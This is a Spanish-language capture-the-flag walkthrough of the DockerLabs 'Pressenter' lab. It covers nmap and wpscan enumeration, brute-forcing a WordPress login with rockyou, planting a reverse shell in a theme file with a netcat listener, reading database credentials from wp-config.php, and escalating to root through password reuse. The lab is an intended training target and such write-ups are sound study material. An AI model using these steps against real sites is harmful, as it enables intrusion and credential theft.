Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #wordpress #dockerlabs

![](../assets/Pasted image 20251107001007.png)

## Reconocimiento

Comenzamos tirando un ping para comprobar conexion
```bash
> ping -c 1 172.17.0.2
--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.250/0.250/0.250/0.000 ms
```

Realizamos un escaneo con nmap para descubrir puertos abiertos
```bash
> nmap -p- -sS -Pn -n --min-rate 5000 172.17.0.2 -oN ports.txt
--------------------------------------------------------------
PORT   STATE SERVICE
80/tcp open  http
```

- Al parecer solo tenemos abierto el puerto 80

Realizamos un segundo escaneo mas profundo sobre el puerto abierto 80
```bash
> sudo nmap -p 80 -sCV -Pn -n --min-rate 5000 -sS 172.17.0.2 -oN target.txt
-----------------------------------------------------------------------------------
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Pressenter CTF
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:29:1E:07:C2:61 (Unknown)
```
- Corre el servicio Apache httpd 2.4.58 ((Ubuntu))

## Enumeración

**Puerto 80**

![](../assets/Pasted image 20251107001538.png)

Segunda tab:
Al parecer es un simple login

![](../assets/Pasted image 20251107001818.png)

Viendo el codigo fuente encontramos un dominio:
```html
    <footer>
        <p>&copy; 2024 Pressenter CTF. All rights reserved.</p>
        <p class="hidden-domain">Find us at <a href="http://pressenter.hl" target="_blank">pressenter.hl</a></p>
    </footer>
```

El dominio no lleva a nada por lo cual decidí meterlo al /etc/hosts
```
172.17.0.2 pressenter.hl
```

Wappalyzer detecta que esta nueva pagina es un WordPress
![](../assets/Pasted image 20251107003510.png)

La ruta de `wp-admin` esta expuesta:
![](../assets/Pasted image 20251107003605.png)


Por lo cual ahora decido utilizar `wpscan` para enumerar posibles usuarios u plugins vulnerables
```bash
[!] 2 vulnerabilities identified:
 | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
 |     Fixed in: 6.6.4
 |     References:
 |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability
 |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
 |     Fixed in: 6.6.4
 |     References:
 |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sensitive-data-exposure-vulnerability
 |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
------------------------------------------------------------------------------------------------------------------------------------------------------------------
[i] User(s) Identified:

[+] pressi
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] hacker
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```
- Encontramos 2 usuarios y 2 vulnerabilidades

## Explotación

Comenzamos haciendo un ataque de fuerza bruta sobre el usuario pressi
```bash
> sudo wpscan --url http://pressenter.hl -U pressi -P /usr/share/wordlists/rockyou.txt
---------------------------------------------------------------------------------------
[!] Valid Combinations Found:
 | Username: pressi, Password: dumbass
```

Dentro del wordpress me dirigí a la parte de herramientas y edite el `index.php` del tema `Twenty Twenty Two` para subir una reverse shell
![](../assets/Pasted image 20251107010844.png)


Me puse en escucha
```bash
> sudo nc -nlvp 443
```
 Y me dirigí a la ruta donde se guardan los temas para ejecutar la reverse shell
 ```
 http://pressenter.hl/wp-content/themes/twentytwentytwo/
 ```

Tenemos acceso al sistema:
```bash
www-data@23bf441840e6:/$ whoami
whoami
www-data
```

## Escalada de Privilegios

Dentro del sistema intente hacer un _sudo -l_ pero al parecer no tenemos permisos. Por lo cual decidí apuntar al directorio _/tmp_ donde había un archivo que no podía leer a menos que fuera el usuario _mysql_
![](../assets/Pasted image 20251107011203.png)

Por lo cual decidí ver el contenido del `wp-config.php`
```bash
> find / -name "wp-config.php" 2>/dev/null
------------------------------------------
/var/www/pressenter/wp-config.php
```

```bash
> cat /var/www/pressenter/wp-config.php
----------------------------------------
/** Database username */
define( 'DB_USER', 'admin' );

/** Database password */
define( 'DB_PASSWORD', 'rooteable' );
```
- Descubrí las credenciales del usuario admin para la base de datos MySQL

Decidí conectarme:
```bash
> mysql -u admin -p'rooteable' -h 127.0.0.1
```

Decidí empezar a listar informacion de la DB
```mysql
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| wordpress          |
+--------------------+
```

- Decido listar las tablas de la base de datos _wordpress_
```mysql
> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_usernames          |
| wp_users              |
+-----------------------+
```

Aquí fue donde encontré la tabla `wp_username` la cual decidí inspeccionar y al parecer descubrí un posible usuario
```mysql
select * from wp_usernames;
+----+----------+-----------------+---------------------+
| id | username | password        | created_at          |
+----+----------+-----------------+---------------------+
|  1 | enter    | kernellinuxhack | 2024-08-22 13:18:04 |
+----+----------+-----------------+---------------------+
```

Migramos al usuario enter
```bash
> su enter
```

Lo primero que hice fue listar binarios con permisos
```bash
> enter@23bf441840e6:/tmp$ sudo -l
sudo -l
Matching Defaults entries for enter on 23bf441840e6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User enter may run the following commands on 23bf441840e6:
    (ALL : ALL) NOPASSWD: /usr/bin/cat
    (ALL : ALL) NOPASSWD: /usr/bin/whoami
```

Lo primero que intente fue hacerle un `cat` al archivo temporal tmp.ZTRADbTigY. Pero no tuve éxito

Por lo cual simplemente probé usar la misma password para el usuario root y lamentablemente funciono.
```bash
> enter@23bf441840e6:/tmp$ su root           
su root
Password: kernellinuxhack

> root@23bf441840e6:/tmp# whoami
whoami
root
```

***PWNED**